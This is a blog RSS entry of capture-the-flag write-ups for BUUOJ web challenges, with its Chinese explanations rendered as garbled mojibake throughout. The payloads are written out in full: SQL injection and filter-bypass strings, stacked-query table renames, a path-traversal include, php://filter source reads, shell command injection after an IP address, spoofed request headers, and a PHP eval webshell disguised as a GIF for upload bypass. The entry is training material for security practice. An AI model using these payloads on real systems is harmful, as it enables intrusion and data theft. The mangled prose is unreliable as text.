<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>LTS on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/lts/</link><description>Recent content in LTS on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 19 Jan 2022 03:16:47 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/lts/index.xml" rel="self" type="application/rss+xml"/><item><title>buuojåˆ·é¢˜è®°å½•-web</title><link>https://amiaaaz.github.io/2022/01/19/buuoj-web-wp/</link><pubDate>Wed, 19 Jan 2022 03:16:47 +0800</pubDate><guid>https://amiaaaz.github.io/2022/01/19/buuoj-web-wp/</guid><description>&lt;p>å› ä¸ºå‰é¢åšçš„å¾ˆå¤šç”±äºŽæ—¶é—´å…³ç³»é—å¿˜äº†ä¸å°‘ï¼Œè¶ç€å¯’å‡æ¥æ¸©æ•…çŸ¥æ–°åˆ·æ³¢é¢˜ï¼Œè¿™é‡Œå°±åšä¸ªbuuoj-webéƒ¨åˆ†åˆ·é¢˜çš„å­˜æ¡£ï¼Œåº”è¯¥éƒ½æ¯”è¾ƒè¯¦ç»†&lt;/p>
&lt;p>æ‰“æ˜Ÿå·çš„å¯èƒ½æ˜¯å› ä¸ºçŽ¯å¢ƒé—®é¢˜å¤çŽ°ä¸äº†ï¼Œæˆ–è€…è‡ªå·±æœ‰åœ°æ–¹æ²¡æžæ‡‚&lt;/p>
&lt;p>â€”â€”â€”â€”å‰æŽ’é£Ÿç”¨æ³¨æ„ï¼šå¯å±•å¼€çš„éƒ¨åˆ†ä¸­æ˜¯æ²¡æœ‰å¾ˆå¥½çš„mdæŽ’ç‰ˆçš„ï¼ˆä¸åšäºŒçº§æ ‡é¢˜æ˜¯ä¸æƒ³å·¦ä¾§tocå’Œæ•´ä½“é¡µé¢å¤ªè‡ƒè‚¿Orz.&lt;/p>
&lt;hr>
&lt;h2 id="page-01">page 01&lt;/h2>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL
&lt;/h4>
&lt;/summary>
&lt;p>å¼±å£ä»¤ç™»å…¥&lt;/p>
&lt;p>&lt;code>admin'or 1#: 12345&lt;/code>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[HCTF 2018]WarmUp
&lt;/h4>
&lt;/summary>
&lt;p>æŸ¥çœ‹é¡µé¢æºç æç¤ºsource.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">emmm&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">checkFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$whitelist&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;source&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#34;source.php&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;hint&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#34;hint.php&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span> &lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">is_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;you can&amp;#39;t see it&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$whitelist&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$_page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">mb_strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#39;?&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;?&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$whitelist&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$_page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$_page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$_page&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">mb_strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_page&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#39;?&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;?&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$whitelist&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;you can&amp;#39;t see it&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span> &lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">is_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">emmm&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">checkFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;lt;img src=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200"> /&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>mb_substr&lt;/code>ä¸Ž&lt;code>substr&lt;/code>ç”¨æ³•ä¸€æ ·&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220117091202170.png" alt="image-20220117091202170">&lt;/p>
&lt;p>æ‰€ä»¥æˆ‘ä»¬åœ¨å‚æ•°å†…å¤šåŠ ä¸€ä¸ª&lt;code>?&lt;/code>å³å¯ï¼Œä½†æ˜¯è¦æ³¨æ„urlencodeï¼Œä»£ç ä¸­æœ‰ä¸€æ¬¡decodeï¼Œæœ¬èº«è¿˜æœ‰ä¸€æ¬¡decodeï¼Œæ‰€ä»¥è¦encodeä¸¤æ¬¡&lt;/p>
&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>/source.php?file=hint.php%253F../../../../../ffffllllaaaagggg
&lt;/code>&lt;/pre>&lt;p>å‚è€ƒï¼š&lt;a href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog">phpmyadmin4.8.1åŽå°getshell&lt;/a>&lt;/p>
&lt;p>åŒæ ·çš„æ–¹å¼ç»•è¿‡wafç™»å…¥æ•°æ®åº“ï¼Œåˆ›å»ºåä¸ºä¸€å¥è¯shellçš„è¡¨ï¼ŒåŒ…å«å¯¹åº”è·¯å¾„çš„æ•°æ®åº“æ–‡ä»¶å¾—åˆ°shell&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]Havefun
&lt;/h4>
&lt;/summary>
&lt;p>é¡µé¢æºç &lt;/p>
&lt;pre tabindex="0">&lt;code>$cat=$_GET['cat'];
echo $cat;
if($cat=='dog'){
echo 'Syc{cat_cat_cat_cat}';
}
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>/?cat=dog
&lt;/code>&lt;/pre>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ACTF2020 æ–°ç”Ÿèµ›]Include
&lt;/h4>
&lt;/summary>
&lt;p>é¦–é¡µæç¤º/?file=flag.phpï¼Œæ–‡ä»¶åŒ…å«ç‚¹ï¼›å°è¯•/etc/passwdï¼ŒæˆåŠŸï¼Œ/flagå¤±è´¥ï¼Œå°è¯•phpä¼ªåè®®&lt;/p>
&lt;pre tabindex="0">&lt;code>/?file=php://filter/convert.base64-encode/resource=flag.php
&lt;/code>&lt;/pre>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨
&lt;/h4>
&lt;/summary>
&lt;pre tabindex="0">&lt;code>1'
1' or '1
1' union select database()#
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°è¿‡æ»¤æ¡ä»¶&lt;/p>
&lt;pre tabindex="0">&lt;code>return preg_match(&amp;quot;/select|update|delete|drop|insert|where|\./i&amp;quot;,$inject);
&lt;/code>&lt;/pre>&lt;p>ä½¿ç”¨å †å æ³¨å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>1';show tables; # ä¸¤ä¸ªè¡¨ 1919810931114514, words
1';show columns from `1919810931114514`; # å«flagåˆ— ä½†åªå›žæ˜¾2åˆ—
1';show columns from `words`; # å›žæ˜¾3åˆ—id+data éƒ½æ˜¯ç©ºçš„
&lt;/code>&lt;/pre>&lt;p>æŠŠ&lt;code>1919810931114514&lt;/code>è¡¨æ”¹åä¸º&lt;code>words&lt;/code>ï¼Œflagæ”¹ä¸ºidï¼Œå³å¯å›žæ˜¾å¯¹åº”çš„data&lt;/p>
&lt;pre tabindex="0">&lt;code>1';alter table words rename to amiz;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
1' or '1 # å¾—åˆ°flag
&lt;/code>&lt;/pre>&lt;p>â€”â€”â€”â€”æˆ–è€…ä½¿ç”¨&lt;code>set&lt;/code>&amp;amp;&lt;code>prepare from&lt;/code>&amp;amp;&lt;code>execute&lt;/code>çš„æ–¹å¼æ¥å †å &lt;/p>
&lt;pre tabindex="0">&lt;code>1';set @xx=concat('se','lect * from `1919810931114514`;');prepare x from @xx;execute x;#
&lt;/code>&lt;/pre>&lt;p>å›žæ˜¾è¿‡æ»¤æ¡ä»¶&lt;/p>
&lt;pre tabindex="0">&lt;code>strstr($inject, &amp;quot;set&amp;quot;) &amp;amp;&amp;amp; strstr($inject, &amp;quot;prepare&amp;quot;)
&lt;/code>&lt;/pre>&lt;p>ç”¨å¤§å†™ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>1';Set @xx=concat('se','lect * from `1919810931114514`;');Prepare x from @xx;execute x;#
&lt;/code>&lt;/pre>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[SUCTF 2019]EasySQL
&lt;/h4>
&lt;/summary>
&lt;pre tabindex="0">&lt;code>1;show tables; # Flag
1;show columns from Flag; # è¢«è¿‡æ»¤
&lt;/code>&lt;/pre>&lt;p>ç”±äºŽæ²¡æœ‰å®Œæ•´çš„æŠ¥é”™é¦–å…ˆçŒœä¸€ä¸‹åŽç«¯è¯­å¥ï¼Œè¾“å…¥éž0æ•°å­—å›žæ˜¾ä¸º1ï¼Œå…¶ä½™ä¸ºç©ºï¼ŒæŽ¨æµ‹åŽç«¯æœ‰&lt;code>||&lt;/code>è¾“å‡º0çš„æƒ…å†µ&lt;/p>
&lt;pre tabindex="0">&lt;code>select $_POST['query'] || flag from Flag;
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>*,1
# ç›¸å½“äºŽ select *,1 from Flag;
&lt;/code>&lt;/pre>&lt;p>â€”â€”â€”â€”æˆ–è€…ä½¿ç”¨å †å ï¼Œpayload&lt;/p>
&lt;pre tabindex="0">&lt;code>1;set sql_mode=PIPES_AS_CONCAT;select 1
&lt;/code>&lt;/pre>&lt;p>å°†&lt;code>||&lt;/code>è½¬å˜ä¸º&lt;code>+&lt;/code>ä¸€æ ·çš„è¿žæŽ¥å­—ç¬¦&lt;/p>
&lt;p>flag{4032c605-fa39-448d-aa2d-f35fca8d3fa9}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ACTF2020 æ–°ç”Ÿèµ›]Exec
&lt;/h4>
&lt;/summary>
&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>127.0.0.1;cat /flag
&lt;/code>&lt;/pre>&lt;p>flag{f8c12653-ce6e-4eef-8f69-9433506d5adc}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]Secret File
&lt;/h4>
&lt;/summary>
&lt;p>é¡µé¢æºç æç¤º/Archive_room.phpï¼Œ/end.phpï¼Œ/secr3t.phpçœ‹åˆ°æ–‡ä»¶åŒ…å«ç‚¹ï¼Œç”¨ä¼ªåè®®&lt;/p>
&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
&lt;/code>&lt;/pre>&lt;p>flag{7719d9f9-6f2f-46f7-bc78-a82cfc52d470}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL
&lt;/h4>
&lt;/summary>
&lt;p>ä¸‡èƒ½å¯†ç ç™»å…¥ï¼Œå¾—åˆ°å¯†ç æ˜¯bd798bc32e819b4f57d4e1523d5834c6&lt;/p>
&lt;pre tabindex="0">&lt;code>admin' union select 1,2,3# # æœ‰3åˆ—
1' union select 1,database(),3# # å›žæ˜¾ä½åœ¨2å’Œ3ä¸Š åº“ågeek
1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database();# # è¡¨ågeekuser, l0ve1ysq1
1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1';# # id, username, password
1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1#
&lt;/code>&lt;/pre>&lt;p>æ³¨æ„&lt;code>group_concat()&lt;/code>æ˜¯ä¸ªå‡½æ•°ï¼Œæ†‹æ‰‹æ¬ åŠ ç©ºæ ¼&lt;/p>
&lt;p>flag{e210152f-fc19-4139-9d2a-dcbb6c4c6268}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[GXYCTF2019]Ping Ping Ping
&lt;/h4>
&lt;/summary>
&lt;pre tabindex="0">&lt;code>127.0.0.1;ls # index.php, flag.php
127.0.0.1;cat flag.php # fxck your space!
127.0.0.1;cat$IFSindex.php # ç©ºå†…å®¹
127.0.0.1;cat$IFSflag.php # fxck your flag!
127.0.0.1;cat$IFS$7`ls` # é¡µé¢æºç å¾—åˆ°flag
127.0.0.1;a=g;cat$IFS$7fla$a.php # é¡µé¢æºç å¾—åˆ°flag
&lt;/code>&lt;/pre>&lt;p>flag{281616ef-7318-42b6-adaf-825edf76ff26}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]Knife
&lt;/h4>
&lt;/summary>
&lt;p>ç™½ç»™shellï¼Œè¿žèšå‰‘&lt;/p>
&lt;p>flag{95a76aa0-58b5-4494-bb49-7f11ce00774d}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]Http
&lt;/h4>
&lt;/summary>
&lt;p>é¡µé¢æºç æç¤º/Secret.phpï¼Œè·Ÿç€æç¤ºä¸€ç›´ä¿®æ”¹è¯·æ±‚å¤´&lt;/p>
&lt;pre tabindex="0">&lt;code>Referer: https://Sycsecret.buuoj.cn
User-Agent: Syclover
X-Forwarded-For: 127.0.0.1
&lt;/code>&lt;/pre>&lt;p>flag{614f3098-1c0f-480b-97f7-9caa49025e83}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]Upload
&lt;/h4>
&lt;/summary>
&lt;p>è¿‡æ»¤äº†å‡ ä¸ªå¸¸è§„çš„phpåŽç¼€ï¼Œç”¨.php7ç»•è¿‡ï¼ŒåŒæ—¶æŠ“åŒ…ä¿®æ”¹MIMEä¸ºimage/png&lt;/p>
&lt;p>ä¹‹åŽå‘çŽ°å®ƒä¼šæ£€æµ‹ä¸Šä¼ å†…å®¹æœ‰æ²¡æœ‰&lt;code>&amp;lt;?&lt;/code>ï¼Œç”¨gif+phtmlæ ·å¼çš„ðŸŽ&lt;/p>
&lt;p>pure.phtml&lt;/p>
&lt;pre tabindex="0">&lt;code>GIF89a
&amp;lt;script language='php'&amp;gt;eval($_POST['amiz']);&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>è¿žèšå‰‘&lt;/p>
&lt;p>flag{23be575a-679e-4f7c-b75b-6e033d10bfca}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ACTF2020 æ–°ç”Ÿèµ›]Upload
&lt;/h4>
&lt;/summary>
&lt;p>å‰ç«¯é™åˆ¶åŽç¼€ç™½åå•jpg, png, gifï¼Œåˆ å®¡æŸ¥å…ƒç´ ä¼šåˆ ä¸æŽ‰å·²ç»æ³¨å†Œäº†çš„å›žè°ƒå‡½æ•°ï¼Œæ‰€ä»¥ç›´æŽ¥æ”¹åŽç¼€åä¸Šä¼ ï¼Œç„¶åŽæŠ“åŒ…æ”¹ä¸€ä¸‹&lt;/p>
&lt;p>pure.html&lt;/p>
&lt;pre tabindex="0">&lt;code>GIF89a
&amp;lt;script language='php'&amp;gt;eval($_POST['amiz']);&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>è¿žèšå‰‘&lt;/p>
&lt;p>flag{a8ff29f2-5197-4599-a1c4-1e8b5f390a8c}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[RoarCTF 2019]Easy Calc
&lt;/h4>
&lt;/summary>
&lt;p>é¡µé¢æºç ï¼šI&amp;rsquo;ve set up WAF to ensure security.&lt;/p>
&lt;p>numå‚æ•°ä»¥getæ–¹å¼ä¼ å…¥ï¼Œä¸å…è®¸æœ‰å­—æ¯ï¼›ç»•è¿‡æ–¹å¼&lt;code>/calc.php ?num=xyx&lt;/code>ï¼ŒåŠ ç©ºæ ¼ï¼›è¿˜æœ‰&lt;code>chr()&lt;/code>+asciiç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">tmp&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;chr(&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">).&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/calc.php? num=1;var_dump(scandir(chr(47))) # çˆ†ç›®å½•æ–‡ä»¶ f1agg
/calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
&lt;/code>&lt;/pre>&lt;p>flag{4f1c0f5a-5a7b-4ad4-b7f4-9eb82de3f93f}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]PHP
&lt;/h4>
&lt;/summary>
&lt;p>å¤‡ä»½æ–‡ä»¶æ³„éœ²/www.zipï¼Œflag.phpä¸­å¾—åˆ°flag&lt;/p>
&lt;p>Syc{dog_dog_dog_dog}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL
&lt;/h4>
&lt;/summary>
&lt;p>æŠŠunion, selectåŒå†™å³å¯&lt;/p>
&lt;pre tabindex="0">&lt;code>admin' ununionion selselectect 1,2,3#
1' uunionnion sselectelect 1,2,group_concat(schema_name) ffromrom infoorrmation_schema.schemata%23 # åº“åinformation_schema,mysql,performance_schema,test,ctf,geek
1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='ctf'%23 # è¡¨å Flag
1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='Flag' # å­—æ®µåflag
1' union select 1,2,group_concat(flag) from ctf.Flag # ctfåº“Flagè¡¨çš„flagå­—æ®µ
&lt;/code>&lt;/pre>&lt;p>flag{b6848383-f7d0-4cad-ad7d-98ab54790bbe}&lt;/p>
&lt;p>å¯ä»¥å†™ä¸€ä¸ªminiè½®ï¼Œç”¨äºŽsqlè¯­å¥åŒå†™ï¼ˆè‡ªå·±å†™çš„æ¯”è¾ƒæ¸£å°±ä¸æ”¾äº†æ&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ACTF2020 æ–°ç”Ÿèµ›]BackupFile
&lt;/h4>
&lt;/summary>
&lt;p>/index.php.bak&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include_once&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;key&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;key&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">is_numeric&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
